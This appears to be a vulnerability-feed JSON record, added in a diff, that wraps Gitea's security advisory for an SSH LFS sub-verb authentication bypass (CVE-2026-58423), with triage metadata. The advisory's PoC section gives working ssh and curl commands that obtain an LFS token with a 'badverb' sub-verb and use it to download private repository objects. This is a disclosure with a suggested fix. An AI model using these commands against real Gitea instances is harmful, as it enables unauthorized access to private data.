@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"author\": null, \"closed_at\": null, \"collaborating_teams\": null, \"collaborating_users\": null, \"created_at\": null, \"credits\": [{\"login\": \"Tomer-PL\", \"type\": \"reporter\"}], \"credits_detailed\": [{\"state\": \"accepted\", \"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/214819466?v=4\", \"events_url\": \"https://api.github.com/users/Tomer-PL/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Tomer-PL/followers\", \"following_url\": \"https://api.github.com/users/Tomer-PL/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Tomer-PL/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Tomer-PL\", \"id\": 214819466, \"login\": \"Tomer-PL\", \"node_id\": \"U_kgDODM3iig\", \"organizations_url\": \"https://api.github.com/users/Tomer-PL/orgs\", \"received_events_url\": \"https://api.github.com/users/Tomer-PL/received_events\", \"repos_url\": \"https://api.github.com/users/Tomer-PL/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Tomer-PL/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Tomer-PL/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Tomer-PL\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-58423\", \"cvss\": {\"score\": 7.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": null, \"vector_string\": null}}, \"cwe_ids\": [\"CWE-287\"], \"cwes\": [{\"cwe_id\": \"CWE-287\", \"name\": \"Improper Authentication\"}], \"description\": \"### Summary\\r\\n\\r\\nA flaw in SSH LFS sub-verb handling allows any authenticated SSH user to obtain valid LFS credentials for any repository on the instance, including private repositories they have no access to. This enables unauthorized download of all LFS objects from any private repository.\\r\\n\\r\\n### Details\\r\\n\\r\\nIn `cmd/serv.go`, the `getAccessMode` function determines the required access level for SSH operations. For LFS verbs (`git-lfs-authenticate`, `git-lfs-transfer`), it switches on the sub-verb (`upload`/`download`). If the sub-verb is neither, execution falls through to:\\r\\n\\r\\n```go\\r\\nsetting.PanicInDevOrTesting(\\\"unknown verb: %s %s\\\", verb, lfsVerb)\\r\\nreturn perm.AccessModeNone\\r\\n```\\r\\n\\r\\nIn production (`IsProd=true`), `PanicInDevOrTesting` only logs an error and does not panic. `AccessModeNone` (value `0`) is then passed to `ServCommand` in `routers/private/serv.go`, where the permission check block at line ~322 evaluates:\\r\\n\\r\\n```go\\r\\nif repoExist &&\\r\\n    (mode > perm.AccessModeRead ||\\r\\n     repo.IsPrivate ||\\r\\n     owner.Visibility.IsPrivate() ||\\r\\n     (user != nil && user.IsRestricted) ||\\r\\n     setting.Service.RequireSignInViewStrict) {\\r\\n    ...\\r\\n    if userMode < mode {  // userMode < 0 is always false\\r\\n        // deny access\\r\\n    }\\r\\n}\\r\\n```\\r\\n\\r\\nFor private repositories, `repo.IsPrivate` triggers the permission check block, but `userMode < mode` evaluates to `userMode < 0`, which is always false — **access is granted regardless of the user's actual permissions**.\\r\\n\\r\\nThe function then returns successfully, and `runServ` generates a valid LFS JWT token with `Op: \\\"badverb\\\"`. On the HTTP LFS side (`services/lfs/server.go:599`), the `Op` field is only validated for write operations:\\r\\n\\r\\n```go\\r\\nif mode == perm_model.AccessModeWrite && claims.Op != \\\"upload\\\" {\\r\\n    return nil, errors.New(\\\"invalid token claim\\\")\\r\\n}\\r\\n```\\r\\n\\r\\nDownload operations do not check `Op`, so the attacker's token is accepted for all LFS read operations.\\r\\n\\r\\n### PoC\\r\\n\\r\\nPrerequisites: A Gitea instance with SSH and LFS enabled (default configuration). Two users: `admin` (owns a private repo with LFS objects) and `attacker` (a regular user with an SSH key, **no access** to the private repo).\\r\\n\\r\\n```bash\\r\\n# 1. Verify attacker has NO access via normal LFS authenticate\\r\\nssh git@gitea-instance \\\"git-lfs-authenticate admin/private-repo.git download\\\"\\r\\n# Output: \\\"User: attacker is not authorized to read admin/private-repo.\\\"\\r\\n\\r\\n# 2. EXPLOIT: Use malformed sub-verb to bypass permission check\\r\\nssh git@gitea-instance \\\"git-lfs-authenticate admin/private-repo.git badverb\\\"\\r\\n# Output: {\\\"header\\\":{\\\"Authorization\\\":\\\"Bearer eyJ...\\\"},\\\"href\\\":\\\"https://gitea-instance/admin/private-repo.git/info/lfs\\\"}\\r\\n\\r\\n# 3. Use stolen token to request LFS object download\\r\\ncurl -X POST \\\"https://gitea-instance/admin/private-repo.git/info/lfs/objects/batch\\\" \\\\\\r\\n  -H \\\"Content-Type: application/vnd.git-lfs+json\\\" \\\\\\r\\n  -H \\\"Accept: application/vnd.git-lfs+json\\\" \\\\\\r\\n  -H \\\"Authorization: Bearer eyJ...\\\" \\\\\\r\\n  -d '{\\\"operation\\\":\\\"download\\\",\\\"objects\\\":[{\\\"oid\\\":\\\"<known-oid>\\\",\\\"size\\\":<size>}]}'\\r\\n# Returns download URL with valid authorization header\\r\\n\\r\\n# 4. Download private LFS content\\r\\ncurl -H \\\"Authorization: Bearer eyJ...\\\" \\\\\\r\\n  \\\"https://gitea-instance/admin/private-repo.git/info/lfs/objects/<oid>\\\"\\r\\n# Returns the private LFS object content\\r\\n```\\r\\n\\r\\n### Impact\\r\\n\\r\\nAny user with SSH access to a Gitea instance (which includes any registered user if self-registration is enabled) can read LFS objects from **any private repository** on the instance, regardless of their actual repository permissions. This is a confidentiality breach affecting all Gitea deployments running in production mode with SSH and LFS enabled (the default configuration).\\r\\n\\r\\n### Suggested fix\\r\\n\\r\\nValidate the LFS sub-verb before calling `getAccessMode`, or return an error instead of `AccessModeNone` for unknown verbs:\\r\\n\\r\\n```go\\r\\ncase git.CmdVerbLfsAuthenticate, git.CmdVerbLfsTransfer:\\r\\n    switch lfsVerb {\\r\\n    case git.CmdSubVerbLfsUpload:\\r\\n        return perm.AccessModeWrite\\r\\n    case git.CmdSubVerbLfsDownload:\\r\\n        return perm.AccessModeRead\\r\\n    default:\\r\\n        return fail(ctx, \\\"Unknown LFS verb\\\", \\\"Unknown LFS verb: %s\\\", lfsVerb)\\r\\n    }\\r\\n```\\r\\n\", \"ghsa_id\": \"GHSA-7wvc-rvp7-w99x\", \"html_url\": \"https://github.com/go-gitea/gitea/security/advisories/GHSA-7wvc-rvp7-w99x\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-7wvc-rvp7-w99x\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-58423\"}], \"private_fork\": null, \"published_at\": \"2026-07-01T02:35:33Z\", \"publisher\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/81045?v=4\", \"events_url\": \"https://api.github.com/users/lunny/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/lunny/followers\", \"following_url\": \"https://api.github.com/users/lunny/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/lunny/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/lunny\", \"id\": 81045, \"login\": \"lunny\", \"node_id\": \"MDQ6VXNlcjgxMDQ1\", \"organizations_url\": \"https://api.github.com/users/lunny/orgs\", \"received_events_url\": \"https://api.github.com/users/lunny/received_events\", \"repos_url\": \"https://api.github.com/users/lunny/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/lunny/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/lunny/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/lunny\", \"user_view_type\": \"public\"}, \"severity\": \"high\", \"state\": \"published\", \"submission\": null, \"summary\": \"LFS authentication bypass via malformed SSH sub-verb allows unauthorized read access to private repositories\", \"updated_at\": \"2026-07-01T02:35:33Z\", \"url\": \"https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-7wvc-rvp7-w99x\", \"vulnerabilities\": [{\"package\": {\"ecosystem\": \"go\", \"name\": \"gitea\"}, \"patched_versions\": \"1.26.3\", \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 1.23.0, <= 1.26.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "gitea:ghsa-7wvc-rvp7-w99x",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "gitea: >= 1.23.0, <= 1.26.2"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-58423"
+    ],
+    "cvss_score": 7.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+    "fixed_versions": [
+      "gitea: 1.26.3"
+    ],
+    "mitigations": [],
+    "products": [
+      "gitea"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-17T23:39:54.396033Z",
+  "provenance": {
+    "content_sha256": "0904a83ce758492b0c490947b3ec971cb2b191b416983f78a55d93315339e3aa",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-01T02:35:33Z",
+  "schema_version": 1,
+  "source_id": "gitea_github",
+  "source_url": "https://github.com/go-gitea/gitea/security/advisories/GHSA-7wvc-rvp7-w99x",
+  "status": "active",
+  "title": "LFS authentication bypass via malformed SSH sub-verb allows unauthorized read access to private repositories",
+  "updated_at": "2026-07-01T02:35:33Z",
+  "vendor": "Gitea",
+  "vendor_advisory_id": "GHSA-7wvc-rvp7-w99x"
+}
